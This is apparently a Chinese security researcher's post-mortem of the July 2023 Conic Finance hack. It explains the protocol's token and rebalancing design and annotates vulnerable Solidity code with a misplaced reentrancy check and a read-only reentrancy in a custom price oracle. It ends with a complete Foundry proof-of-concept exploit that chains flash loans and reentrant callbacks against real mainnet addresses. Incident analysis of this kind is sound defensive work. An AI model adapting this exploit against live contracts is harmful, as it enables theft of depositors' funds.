2023年7月21日， Conic Finance被攻击，造成项目方损失350万美元。  
漏洞来源：https://twitter.com/BlockSecTeam/status/1682356244299010049#  
针对此攻击事件的个人理解如下，如有理解不正确的地方 欢迎广大老师们给予宝贵的建议。

## 一 经济模型解读

### 1.1 cnc 代币

CNC 允许用户在多个 Curve 池之间转移资产的流动性。  
这是通过 Conic DAO流动性分配投票(LAV) 实现的，它更新 Conic Omnipools 使用的每个 Curve 池的流动性分配权重。  
为了获得参与 LAV 的资格，持有者必须首先锁定vlCNC 的 CNC。

#### 如何获得cnc代币

  * 流动性提供者可以通过质押其 Conic Omnipool LP 代币来接收 CNC

  * 再平衡期间向存款人发放cnc，以激励 Omnipools 的再平衡

  * CNC 可以在 AMM 上购买（例如Curve CNC/ETH 池）

#### cnc供应

vlCVX持有者：10%  
社区筹集：30%  
流动性提供者：44%  
Conic Omnipool LP 代币的质押者为 25%  
19% 用于再平衡激励 (个人认为是弥补给价格波动给流动质押者带来的无常损失)  
财政部：6% （一年内线性归属的 5% + 启动时归属的 1% 用于为 Curve CNC/ETH 池提供种子）  
AMM 质押者：10% （分配给 Curve 工厂池 CNC/ETH LP 代币的质押者）  
![image.png](https://image.3001.net/images/20230730/1690649702_64c544660bb2ba28f8ccd.png!small)

#### 锁定

CNC 可以锁定四到八个月，以换取投票锁定 CNC (vlCNC)。  
人们锁定 CNC 的时间越长，他们的 vlCNC 余额就越高。  
vlCNC 持有者可以参加每两周一次的流动性投票（即每两周），从而确定特定 Curve 池获得的资产流动性的权重会针对每个 Omnipool 进行更新。  
vlCNC 持有者可以对 Curve 池的白名单和黑名单进行投票，这些池可用于接收 Omnipool 中的流动性。  
vlCNC 持有者投票决定将哪些资产添加到平台。  
vlCNC 持有者可以通过提交

### 1.2 Omnipools

允许用户将单一资产存入部署的 Conic Omnipool 中跨多个 Curve 池的流动性

Omnipools 的核心机制是：存款和取款  
Omnipools是什么  
Omnipool 是 Conic 用于在多个 Curve 池中分配单一标的资产的流动性池。  
例如，USDC Omnipool 接受 USDC 存款，并将其分配给多个以 USDC 作为基础代币的 Curve 池

#### 如何创建新的 Omnipool？

新的 Omnipool 需要通过治理提出和批准

#### 如何累积 CRV、CVX 和 CNC

CRV, CVX and CNC accrue to stakers of Omnipool LP tokens. By default, Omnipool
LP toke

#### Omnipools 如何在多个 Curve 池中重新平衡资金？

Omnipools 依赖于基于存款和取款的激励和被动再平衡系统。当用户存入 Omnipool 时，存款将始终存入相对于目标分布分配最少的 Curve
Pool，而当用户提款时，存款将来自分配最多的 Curve Pool。这意味着通过定期存款和取款，资金池将保持平衡状态。  
为了激励定期存款和取款，当矿池不平衡且重新平衡奖励期有效时，向 Omnipools 存款的用户将获得 CNC (个人认为是弥补无常损失)。在
Omnipool 中更新曲线池权重后（即在 LAV 之后），将激活此周期。收到的 CNC
将基于存入的金额，并且在矿池不平衡时也会随着时间的推移而增加，并在矿池再次平衡时停止。  
`一旦 Omnipool 在允许的偏差阈值内达到平衡，用于激励存款的 CNC释放量 将设置为零，直到下一个重新平衡期。`

#### 再平衡功能

对于希望重新平衡 Omnipool 以获得 CNC 奖励的机器人和套利者，他们可以通过调用重新平衡函数来实现。  
机器人 调用再平衡功能比手动从 Omnipools 存取款更高效，并且可以为用户带来更高数额的 CNC 奖励。  
手动再平衡  
https://etherscan.io/address/0x4D080be793fb7934a920cbDd95010b893AEda545#writeContract  
handleDepeggedCurvePool(address curvePool_)  
![image.png](https://image.3001.net/images/20230730/1690649921_64c54541d8a213a1db400.png!small)

个人对rebalance的一些理解 以curve为例子  
`在Curve池中，depegged通常指的是一个池子中的资产价值与其它池子或市场中的资产价值不一致。
当一个资产的价值偏离了其它资产时，这个资产就被认为是depegged了。
在这种情况下，如果您想退出池子，您可能需要支付更高或更低的费用，具体取决于您持有的资产是否depegged。`

#### 故意Omnipool 失衡

如果有人故意使 Omnipool 失衡怎么办？  
根据设计Omnipool 不允许故意不平衡。  
当存入 Omnipool 时，存款将存入相对于其目标分配而言分配最不足的 Curve 池。  
同样，当从 Omnipool 提款时，提款将始终从超额分配最多的 Curve 矿池中进行。  
但是当存款或取款金额过大时，会以另一种方式推动 Curve 池的余额，导致其比以前更加不平衡，并超过指定的不平衡阈值。  
在这种情况下，将进行全额存款，存款被分配到多个 Curve 池中，以便存款/取款后 Omnipool 相对平衡。

#### 脱钩 depeg

如果代币脱离了 Omnipool 曲线池，会发生什么？  
在Curve池中，depegged通常指的是一个池子中的资产价值与其它池子或市场中的资产价值不一致。  
当一个资产的价值偏离了其它资产时，这个资产就被认为是depegged了。  
在这种情况下，如果您想退出池子，您可能需要支付更高或更低的费用，具体取决于您持有的资产是否depegged。

如果代币在其中一个 Curve Pool 中脱钩，任何人都可以触发一项操作，以帮助保护 Omnipool 免受脱钩的影响。  
此操作会导致 Curve Pool 的权重设置为 0，并且再次为存款启用 CNC 重新平衡奖励。  
这样做的结果是，Omnipool 应该从脱钩的 Curve Pool 中提取资金，并在提取时将其转移到其他 Curve Pool 中。

 **请注意，**  
`handleDepeggedCurvePool该函数不会自动重新平衡池`。  
这仍然需要单独完成（例如，通过函数rebalance）,  
我的理解就是 就是depeg 触发脱钩的状态  
`个人从代码的理解是需要 手工促发 先 handleDepeggedCurvePool 然后再 调用 rebalance() 返回质押物和cnc奖励`  
Curve Pool 被解除挂钩的定义是，自上次更新 Omnipool 权重以来，Curve LP 代币的偏差是否超过解除挂钩阈值。  
depeg 阈值可以通过治理进行更新，在合约部署时初始化为 3%。

* * *

## 二 项目地址(合约部署地址)

https://docs.conic.finance/conic-finance/faq/contract-addresses  
![image.png](https://image.3001.net/images/20230730/1690650098_64c545f2e693e4efe56c0.png)

 **部分代码解读**  
eth_0xbb787d6243a8d450659e09ea6fd82f1c859691e9/ConicEthPool.sol

### handleDepeggedCurvePool 使池子脱钩

当调用的质押池 脱钩的时候 我们想退出 这个pool的流动性 ,就促发这个函数  
这时候如果是真的 将会得到cnc补偿

    
    
    /// @notice Called when an underlying of a Curve Pool has depegged and we want to exit the pool.
    /// Will check if a coin has depegged, and will revert if not.
    /// Sets the weight of the Curve Pool to 0, and re-enables CNC rewards for deposits.
    /// @dev Cannot be called if the underlying of this pool itself has depegged.
    /// @param curvePool_ The Curve Pool to handle.
    function handleDepeggedCurvePool(address curvePool_) external override {
            // Validation
            require(isRegisteredCurvePool(curvePool_), "pool is not registered");
            require(weights.get(curvePool_) != 0, "pool weight already 0");
            address lpToken_ = controller.curveRegistryCache().lpToken(curvePool_);
            require(_isDepegged(lpToken_), "pool is not depegged");
    
            // Set target curve pool weight to 0
            // Scale up other weights to compensate
            _setWeightToZero(curvePool_);
            rebalancingRewardActive = true;
    
            emit HandledDepeggedCurvePool(curvePool_);
        }
    

eth_0x4d080be793fb7934a920cbdd95010b893aeda545_code  
CNCMintingRebalancingRewardsHandlerV2.sol

### rebalance()流动性再平衡

    
    
    //流动性再平衡, 触发再平衡会给以cnc作为回报
    function rebalance(
        address conicPool,
        uint256 underlyingAmount, //抵押金额
        uint256 minUnderlyingReceived, //最小收到的金额
        uint256 minCNCReceived  //最小的cnc金额
    ) external override returns (uint256 underlyingReceived, uint256 cncReceived) {
        require(controller.isPool(conicPool), "not a pool");
        IConicPool conicPool_ = IConicPool(conicPool);
        //获取抵押资产
        IERC20 underlying = conicPool_.underlying();
        require(underlying.balanceOf(msg.sender) >= underlyingAmount, "insufficient underlying");
        //计算 总偏差(我认为:此值来判断是否需要再次触发脱钩)
        uint256 deviationBefore = conicPool_.computeTotalDeviation();
        //返回抵押资产
        underlying.safeTransferFrom(msg.sender, address(this), underlyingAmount);
        underlying.safeApprove(conicPool, underlyingAmount);
    
        //这里有个重入保护
        _isInternal = true;
        //cnc pool存抵押资产,作为cnc的 lptoken
        uint256 lpTokenAmount = conicPool_.deposit(underlyingAmount, 0, false);
        _isInternal = false;
    
        //提取
        underlyingReceived = conicPool_.withdraw(lpTokenAmount, 0);
        require(underlyingReceived >= minUnderlyingReceived, "insufficient underlying received");
        uint256 cncBefore = cnc.balanceOf(msg.sender);
    
        // Only distribute rebalancing rewards if active
        //只有 rebalacing的状态为true的时候才会 分发cnc
        //之后再次计算总偏差
        if (conicPool_.rebalancingRewardActive()) {
            uint256 deviationAfter = conicPool_.computeTotalDeviation();
            //
            _handleRebalancingRewards(conicPool_, msg.sender, deviationBefore, deviationAfter);
        }
    
        cncReceived = cnc.balanceOf(msg.sender) - cncBefore;
        require(cncReceived >= minCNCReceived, "insufficient CNC received");
        underlying.safeTransfer(msg.sender, underlyingReceived);
    }
    

* * *

## 三攻击分析

原因:重入攻击 +只读重入  
我个人分析是`两个重入点构成`

#### 3.1 添加流动性

在 漏洞合约ConicEthPool 中存钱 相当于间接添加了 其他pool 如curve pools中的流动性  
![image.png](https://image.3001.net/images/20230730/1690650379_64c5470b9c9cda5032359.png)

https://explorer.phalcon.xyz/tx/eth/0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146?line=3907&debugLine=3907

#### 3.2 移除流动性

经过上面的 deposite , add_liquidity后 是 池子价格脱钩  
所以在remove_liquidity中先用 handleDepeggedCurvePool()进行 状态变量修改,是满足自定义价格预言机的条件  
再次remove_liquidity 回调中 重入withdraw, 进行只读操控价格

更改状态为脱钩

大致结构如下面的两图

![image.png](https://image.3001.net/images/20230730/1690650413_64c5472dbf03006e14289.png)

![image.png](https://image.3001.net/images/20230730/1690650430_64c5473e485ab44baee07.png)

#### 3.2.1 重入 handleDepeggedCurvePool

`handleDepeggedCurvePool(address curvePool_) 有两个可能被利用的地方`  
1 当weight == 0 的时候 自定义预言机价格操控  
2 协议为弥补无常损失,会发给流动性添加者cnc代币补偿,拿到cnc后去其他的swap pool中变现 如cnc/usdc 此类的池子  
目的为了 获得 withdraw 后因为流动性的损失 获得 cnc代币补偿

![image.png](https://image.3001.net/images/20230730/1690650540_64c547ac2f184019c2444.png)

![image.png](https://image.3001.net/images/20230730/1690650555_64c547bbc8213c309ec27.png)  
https://explorer.phalcon.xyz/tx/eth/0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146?line=4658&debugLine=4658

#### 3.2.2 withdraw() 中 重入防护失败

移除流动性后 fallback中 提款withdraw()函数  
其中会 调用预言机进行价格计算  
当 chainlink 没有的币种会调用自己部署预言机合约  
漏洞就出现了  
https://explorer.phalcon.xyz/tx/eth/0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146?line=4599&debugLine=4599

![image.png](https://image.3001.net/images/20230730/1690650597_64c547e542430ac651871.png)

重入 价格操控提款  
chainlink 预言机 中没有此token所以使用自定义的预言机  
GenericOracleV2.getUSDPrice()  
https://explorer.phalcon.xyz/tx/eth/0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146?line=4610&debugLine=4610  
![image.png](https://image.3001.net/images/20230730/1690650623_64c547ffc466e30e163d1.png)

当 ChainlinkOracleV2.isTokenSupported为false的时候  
chainlink 预言机 无法支持当前token 的时候 此处token为 rETH-f
0x6c38ce8984a890f5e46e6df6117c26b3f1ecfc9c

![image.png](https://image.3001.net/images/20230730/1690650652_64c5481cacaaceebba5c8.png)

https://explorer.phalcon.xyz/tx/eth/0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146?line=5875&debugLine=5875  
代码会这里走 customOracles[token].getUSDPrice(token);  
![image.png](https://image.3001.net/images/20230730/1690650685_64c5483de627cf3b165bb.png)

这个是自己conic.fl 部署的预言机合约  
![image.png](https://image.3001.net/images/20230730/1690650715_64c5485bac6d19f8ca625.png)

https://etherscan.io/address/0x7b528B4Fd3E9f6b1701817C83f2CcB16496Ba03e#code  
无重入保护  
https://explorer.phalcon.xyz/tx/eth/0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146?line=5448&debugLine=5448  
![image.png](https://image.3001.net/images/20230730/1690650744_64c54878b8e89063c0231.png)

![image.png](https://image.3001.net/images/20230730/1690650757_64c5488501a2af6642c1a.png)

* * *

## 四 代码审计漏洞分析

漏洞合约地址 eth_0xbb787d6243a8d450659e09ea6fd82f1c859691e9

ConicEthPool.sol

### 4.1 withdraw 重入防护失败

_withdrawFromCurve()在前 _reentrancyCheck() 在后面 ,重入防护失败

    
    
    /// @notice Withdraw underlying
    /// @param conicLpAmount Amount of LP tokens to burn
    /// @param minUnderlyingReceived Minimum amount of underlying to redeem
    /// This should always be set to a reasonable value (e.g. 2%), otherwise
    /// the user withdrawing could be forced into paying a withdrawal penalty fee
    /// by another user
    /// @return uint256 Total underlying withdrawn
    function withdraw(
        uint256 conicLpAmount,
        uint256 minUnderlyingReceived
    ) public override returns (uint256) {
        // Preparing Withdrawals
        require(lpToken.balanceOf(msg.sender) >= conicLpAmount, "insufficient balance");
        uint256 underlyingBalanceBefore_ = underlying.balanceOf(address(this));
    
        // Processing Withdrawals
        (
            uint256 totalUnderlying_,
            uint256 allocatedUnderlying_,
            uint256[] memory allocatedPerPool
        ) = getTotalAndPerPoolUnderlying();
        uint256 underlyingToReceive_ = conicLpAmount.mulDown(_exchangeRate(totalUnderlying_));
        {
            if (underlyingBalanceBefore_ < underlyingToReceive_) {
                uint256 underlyingToWithdraw_ = underlyingToReceive_ - underlyingBalanceBefore_;
                //利用curvePoll进行提款
                //!!here
                _withdrawFromCurve(allocatedUnderlying_, allocatedPerPool, underlyingToWithdraw_);
            }
        }
    
        // Sending Underlying and burning LP Tokens
        uint256 underlyingWithdrawn_ = _min(
            underlying.balanceOf(address(this)),
            underlyingToReceive_
        );
        require(underlyingWithdrawn_ >= minUnderlyingReceived, "too much slippage");
        lpToken.burn(msg.sender, conicLpAmount);
        underlying.safeTransfer(msg.sender, underlyingWithdrawn_);
    
        _cachedTotalUnderlying = totalUnderlying_ - underlyingWithdrawn_;
        _cacheUpdatedTimestamp = block.timestamp;
    
        emit Withdraw(msg.sender, underlyingWithdrawn_);
        _reentrancyCheck();
        return underlyingWithdrawn_;
    }
    

跟进

    
    
    function _withdrawFromCurve(
            uint256 totalUnderlying_,
            uint256[] memory allocatedPerPool,
            uint256 amount_
        ) internal {
            uint256 withdrawalsRemaining_ = amount_;
            uint256 totalAfterWithdrawal_ = totalUnderlying_ - amount_;
    
            // NOTE: avoid modifying `allocatedPerPool`
            uint256[] memory allocatedPerPoolCopy = allocatedPerPool.copy();
    
            while (withdrawalsRemaining_ > 0) {
                (uint256 curvePoolIndex_, uint256 maxWithdrawal_) = _getWithdrawPool(
                    totalAfterWithdrawal_,
                    allocatedPerPoolCopy
                );
                address curvePool_ = _curvePools.at(curvePoolIndex_);
    
                // Withdrawing from least balanced Curve pool
                uint256 toWithdraw_ = _min(withdrawalsRemaining_, maxWithdrawal_);
                //!!here
                _withdrawFromCurvePool(curvePool_, toWithdraw_);
                withdrawalsRemaining_ -= toWithdraw_;
                allocatedPerPoolCopy[curvePoolIndex_] -= toWithdraw_;
            }
        }
    

跟进 _getWithdrawPool()  
`想办法进入 weight_ == 0 这个分支 才是利用点`

    
    
    function _getWithdrawPool(
           uint256 totalUnderlying_,
           uint256[] memory allocatedPerPool
       ) internal view returns (uint256 withdrawPoolIndex, uint256 maxWithdrawalAmount) {
           uint256 curvePoolCount_ = allocatedPerPool.length;
           int256 iWithdrawPoolIndex = -1;
           for (uint256 i; i < curvePoolCount_; i++) {
               address curvePool_ = _curvePools.at(i);
               uint256 weight_ = weights.get(curvePool_);
               uint256 allocatedUnderlying_ = allocatedPerPool[i];
    
               //如果 curve pool权重为0 的时候
               // If a curve pool has a weight of 0,
               // withdraw from it if it has more than the max lp value
               if (weight_ == 0) {
                   //使用自定义的价格预言机
                   uint256 price_ = controller.priceOracle().getUSDPrice(address(underlying));
                   uint256 allocatedUsd = (price_ * allocatedUnderlying_) /
                       10 ** underlying.decimals();
                   if (allocatedUsd >= _MAX_USD_LP_VALUE_FOR_REMOVING_CURVE_POOL / 2) {
                       return (uint256(i), allocatedUnderlying_);
                   }
               }
    
               uint256 targetAllocation_ = totalUnderlying_.mulDown(weight_);
               if (allocatedUnderlying_ <= targetAllocation_) continue;
               uint256 minBalance_ = targetAllocation_ - targetAllocation_.mulDown(_getMaxDeviation());
               uint256 maxWithdrawalAmount_ = allocatedUnderlying_ - minBalance_;
               if (maxWithdrawalAmount_ <= maxWithdrawalAmount) continue;
               maxWithdrawalAmount = maxWithdrawalAmount_;
               iWithdrawPoolIndex = int256(i);
           }
           require(iWithdrawPoolIndex > -1, "error retrieving withdraw pool");
           withdrawPoolIndex = uint256(iWithdrawPoolIndex);
       }
    

uint256 price_ = controller.priceOracle().getUSDPrice(address(underlying));  
真实的 会调用到  
eth_0x7b528b4fd3e9f6b1701817c83f2ccb16496ba03e  
CurveLPOracleV2.sol

    
    
    function getUSDPrice(address token) external view returns (uint256) {
                IOracle genericOracle = controller.priceOracle();
    
                // Getting the pool data
                address pool = _getCurvePool(token);
                ICurveRegistryCache curveRegistryCache_ = controller.curveRegistryCache();
                require(curveRegistryCache_.isRegistered(pool), "token not supported");
                uint256[] memory decimals = curveRegistryCache_.decimals(pool);
                address[] memory coins = curveRegistryCache_.coins(pool);
    
                // Adding up the USD value of all the coins in the pool
                uint256 value;
                uint256 numberOfCoins = curveRegistryCache_.nCoins(pool);
                uint256[] memory prices = new uint256[](numberOfCoins);
                uint256[] memory thresholds = new uint256[](numberOfCoins);
                for (uint256 i; i < numberOfCoins; i++) {
                    address coin = coins[i];
                    uint256 price = genericOracle.getUSDPrice(coin);
                    prices[i] = price;
                    thresholds[i] = imbalanceThresholds[token];
                    require(price > 0, "price is 0");
                    uint256 balance = _getBalance(pool, i);
                    require(balance > 0, "balance is 0");
                    value += balance.convertScale(uint8(decimals[i]), 18).mulDown(price);
                }
    
                // Verifying the pool is balanced
                CurvePoolUtils.ensurePoolBalanced(
                    CurvePoolUtils.PoolMeta({
                        pool: pool,
                        numberOfCoins: numberOfCoins,
                        assetType: curveRegistryCache_.assetType(pool),
                        decimals: decimals,
                        prices: prices,
                        thresholds: thresholds
                    })
                );
    
                // Returning the value of the pool in USD per LP Token
                return value.divDown(IERC20(token).totalSupply());
            }
    

### 4.2 价格操作 Ommipools价格脱钩

`除了修改状态变量 pool 的权重 weight==0 指定自定义预言机 还会 额外会收获 获得 cnc代币作为无常损失的补偿`

    
    
    /// @notice Called when an underlying of a Curve Pool has depegged and we want to exit the pool.
        /// Will check if a coin has depegged, and will revert if not.
        /// Sets the weight of the Curve Pool to 0, and re-enables CNC rewards for deposits.
        /// @dev Cannot be called if the underlying of this pool itself has depegged.
        /// @param curvePool_ The Curve Pool to handle.
        function handleDepeggedCurvePool(address curvePool_) external override {
            // Validation
            require(isRegisteredCurvePool(curvePool_), "pool is not registered");
            require(weights.get(curvePool_) != 0, "pool weight already 0");
            address lpToken_ = controller.curveRegistryCache().lpToken(curvePool_);
            require(_isDepegged(lpToken_), "pool is not depegged");
    
            // Set target curve pool weight to 0
            // Scale up other weights to compensate
            ////设置池子权重为0
            _setWeightToZero(curvePool_);
            rebalancingRewardActive = true;
    
            emit HandledDepeggedCurvePool(curvePool_);
        }
    

* * *

## 五 poc

    
    
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.10;
    
    import "forge-std/Test.sol";
    import "./interface.sol";
    
    
    // Twitter Guy : https://twitter.com/BlockSecTeam/status/1682356244299010049
    
    
    interface IConicEthPool {
        function handleDepeggedCurvePool(address) external;
    
        function deposit(uint256 underlyingAmount, uint256 minLpReceived, bool stake) external returns (uint256);
    
        function withdraw(uint256 conicLpAmount, uint256 minUnderlyingReceived) external returns (uint256);
    }
    
    interface IGenericOracleV2 {
        function getUSDPrice(address) external returns (uint256);
    }
    
    interface ICurve {
        function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external payable returns (uint256);
    
        function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);
    
        function remove_liquidity(
            uint256 token_amount,
            uint256[2] memory min_amounts,
            bool use_eth,
            address receiver
        ) external;
    }
    
    contract ContractTest is Test {
        IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
        IERC20 rETH = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
        IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
        IERC20 cbETH = IERC20(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704);
        IERC20 steCRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
        IERC20 cbETH_ETH_LP = IERC20(0x5b6C539b224014A09B3388e51CaAA8e354c959C8);
        IERC20 rETH_ETH_LP = IERC20(0x6c38cE8984a890F5e46e6dF6117C26b3F1EcfC9C);
        IERC20 cncETH = IERC20(0x3565A68666FD3A6361F06f84637E805b727b4A47);
        ICurve rETH_ETH_Pool = ICurve(0x0f3159811670c117c372428D4E69AC32325e4D0F);
        ICurve cbETH_ETH_Pool = ICurve(0x5FAE7E604FC3e24fd43A72867ceBaC94c65b404A);
        IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        IAaveFlashloan aaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
        IAaveFlashloan aaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
        ICurvePool LidoCurvePool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
        IConicEthPool ConicEthPool = IConicEthPool(0xBb787d6243a8D450659E09ea6fD82F1C859691e9);
        IGenericOracleV2 Oracle = IGenericOracleV2(0x286eF89cD2DA6728FD2cb3e1d1c5766Bcea344b0);
        uint256 nonce;
    
        function setUp() public {
            vm.createSelectFork("mainnet", 17_740_954);
            vm.label(address(WETH), "WETH");
            vm.label(address(steCRV), "steCRV");
            vm.label(address(cbETH_ETH_LP), "cbETH_ETH_LP");
            vm.label(address(rETH_ETH_LP), "rETH_ETH_LP");
            vm.label(address(cncETH), "cncETH");
            vm.label(address(stETH), "stETH");
            vm.label(address(rETH), "rETH");
            vm.label(address(cbETH), "cbETH");
            vm.label(address(LidoCurvePool), "LidoCurvePool");
            vm.label(address(rETH_ETH_Pool), "rETH_ETH_Pool");
            vm.label(address(cbETH_ETH_Pool), "cbETH_ETH_Pool");
            vm.label(address(cncETH), "cncETH");
            vm.label(address(Balancer), "Balancer");
            vm.label(address(aaveV3), "aaveV3");
            vm.label(address(aaveV2), "aaveV2");
            vm.label(address(ConicEthPool), "ConicEthPool");
            vm.label(address(Oracle), "Oracle");
        }
    
        function testExploit() external {
            deal(address(this), 0);
            WETH.approve(address(rETH_ETH_Pool), type(uint256).max);
            WETH.approve(address(LidoCurvePool), type(uint256).max);
            WETH.approve(address(cbETH_ETH_Pool), type(uint256).max);
            WETH.approve(address(ConicEthPool), type(uint256).max);
            stETH.approve(address(LidoCurvePool), type(uint256).max);
            rETH.approve(address(rETH_ETH_Pool), type(uint256).max);
            cbETH.approve(address(cbETH_ETH_Pool), type(uint256).max);
    
            aaveV2Flashloan();
    
            sellAllTokenToWETH();
            emit log_named_decimal_uint(
                "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
            );
        }
    
        function aaveV2Flashloan() internal {
            address[] memory assets = new address[](1);
            assets[0] = address(stETH);
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = 20_000 ether;
            uint256[] memory modes = new uint[](1);
            modes[0] = 0;
            aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
        }
    
        // @Info aaveV2 flashLoan callback
        function executeOperation(
            address[] calldata assets,
            uint256[] calldata amounts,
            uint256[] calldata premiums,
            address initiator,
            bytes calldata params
        ) external returns (bool) {
            aaveV3.flashLoanSimple(address(this), address(cbETH), 850 ether, new bytes(0), 0);
            IERC20(assets[0]).approve(address(aaveV2), amounts[0] + premiums[0]);
            return true;
        }
    
        // @Info aaveV3 flashLoan callback
        function executeOperation(
            address asset,
            uint256 amount,
            uint256 premium,
            address initator,
            bytes calldata params
        ) external payable returns (bool) {
            balancerFlashloan();
            IERC20(asset).approve(address(aaveV3), premium + amount);
            return true;
        }
    
        function balancerFlashloan() internal {
            address[] memory tokens = new address[](3);
            tokens[0] = address(rETH);
            tokens[1] = address(cbETH);
            tokens[2] = address(WETH);
            uint256[] memory amounts = new uint256[](3);
            amounts[0] = 20_550 ether;
            amounts[1] = 3000 ether;
            amounts[2] = 28_504.2 ether;
            bytes memory userData = "";
            Balancer.flashLoan(address(this), tokens, amounts, userData);
        }
    
        // @Info balancerVault flashLoan callback
        function receiveFlashLoan(
            address[] memory tokens,
            uint256[] memory amounts,
            uint256[] memory feeAmounts,
            bytes memory userData
        ) external {
            // repeatedly deposit WETH to ConicEthPool and swap cbETH,rETH to WETH
            for (uint256 i; i < 7; ++i) {
                ConicEthPool.deposit(1214 ether, 0, false);
                cbETH_ETH_Pool.exchange(1, 0, 121 ether, 0);
                rETH_ETH_Pool.exchange(1, 0, 121 ether, 0);
            }
    
            reenter_1();
    
            emit log_named_decimal_uint(
                "before Read-Only-Reentrancy cbETH_ETH_LP Price",
                Oracle.getUSDPrice(address(cbETH_ETH_LP)),
                cbETH_ETH_LP.decimals()
            );
            reenter_2();
    
            emit log_named_decimal_uint(
                "before Read-Only-Reentrancy rETH_ETH_LP Price",
                Oracle.getUSDPrice(address(rETH_ETH_LP)),
                rETH_ETH_LP.decimals()
            );
            reenter_3();
    
            // repay flashLoan
            rETH_ETH_Pool.exchange(0, 1, 3450 ether, 0); // swap WETH to rETH
            cbETH_ETH_Pool.exchange(0, 1, 850 ether, 0); // swap WETH to cbETH
            ConicEthPool.withdraw(cncETH.balanceOf(address(this)), 0);
            WETH.deposit{value: address(this).balance}();
            rETH_ETH_Pool.exchange(0, 1, 1100 ether, 0); // swap WETH to rETH
            WETH.withdraw(300 ether);
            LidoCurvePool.exchange{value: 300 ether}(0, 1, 300 ether, 0); // swap WETH to stETH
    
            IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);
            IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);
            IERC20(tokens[2]).transfer(msg.sender, amounts[2] + feeAmounts[2]);
        }
    
        function reenter_1() internal {
            WETH.withdraw(20_000 ether);
            uint256[2] memory amount;
            amount[0] = 20_000 ether;
            amount[1] = stETH.balanceOf(address(this));
            LidoCurvePool.add_liquidity{value: 20_000 ether}(amount, 0); // mint steCRV
            amount[0] = 0;
            amount[1] = 0;
            emit log_named_decimal_uint(
                "before Read-Only-Reentrancy steCRV Price", Oracle.getUSDPrice(address(steCRV)), steCRV.decimals()
            );
            nonce++;
            LidoCurvePool.remove_liquidity(steCRV.balanceOf(address(this)), amount); // burn steCRV, first reentrancy enter point
        }
    
        function reenter_2() internal {
            uint256[2] memory amount;
            WETH.withdraw(WETH.balanceOf(address(this)) - 4 ether);
            cbETH_ETH_Pool.exchange(1, 0, cbETH.balanceOf(address(this)), 0); // swap cbETH to WETH
            amount[0] = 1.8 ether;
            amount[1] = 0;
            cbETH_ETH_Pool.add_liquidity(amount, 0); // mint cbETH/ETH-f
            amount[0] = 0;
    
            nonce++;
            cbETH_ETH_Pool.remove_liquidity(cbETH_ETH_LP.balanceOf(address(this)), amount, true, address(this)); // burn cbETH/ETH-f, second reentrancy enter point
        }
    
        function reenter_3() internal {
            cbETH_ETH_Pool.exchange(0, 1, WETH.balanceOf(address(this)), 0); // swap WETH to cbETH
            rETH_ETH_Pool.exchange(1, 0, rETH.balanceOf(address(this)), 0); // swap rETH to WETH
            uint256[2] memory amount;
            amount[0] = 2.4 ether;
            amount[1] = 0;
            rETH_ETH_Pool.add_liquidity(amount, 0); // mint rETH/ETH-f
            amount[0] = 0;
    
            nonce++;
            rETH_ETH_Pool.remove_liquidity(rETH_ETH_LP.balanceOf(address(this)), amount, true, address(this)); // burn rETH/ETH-f, third reentrancy enter point
        }
    
        receive() external payable {
            if (msg.sender != address(WETH)) {
                if (nonce == 1) {
                    emit log_named_decimal_uint(
                        "In Read-Only-Reentrancy steCRV Price", 
                        Oracle.getUSDPrice(address(steCRV)), 
                        steCRV.decimals()
                    );
                    ConicEthPool.handleDepeggedCurvePool(address(LidoCurvePool)); // set LidoCurvePool as depegged pool
                } else if (nonce == 2) {
                    emit log_named_decimal_uint(
                        "In Read-Only-Reentrancy cbETH_ETH_LP Price",
                        Oracle.getUSDPrice(address(cbETH_ETH_LP)),
                        cbETH_ETH_LP.decimals()
                    );
                    ConicEthPool.handleDepeggedCurvePool(address(cbETH_ETH_Pool)); // set cbETH_ETH_Pool as depegged pool
                } else if (nonce == 3) {
                    emit log_named_decimal_uint(
                        "In Read-Only-Reentrancy rETH_ETH_LP Price",
                        Oracle.getUSDPrice(address(rETH_ETH_LP)),
                        rETH_ETH_LP.decimals()
                    );
                    ConicEthPool.withdraw(6292 ether, 0); // withdraw assets from ConicEthPool
                    nonce++;
                }
            }
        }
    
        function sellAllTokenToWETH() internal {
            cbETH_ETH_Pool.exchange(1, 0, cbETH.balanceOf(address(this)), 0);
            rETH_ETH_Pool.exchange(1, 0, rETH.balanceOf(address(this)), 0);
            LidoCurvePool.exchange(1, 0, stETH.balanceOf(address(this)), 0);
            WETH.deposit{value: address(this).balance}();
        }
    }
    

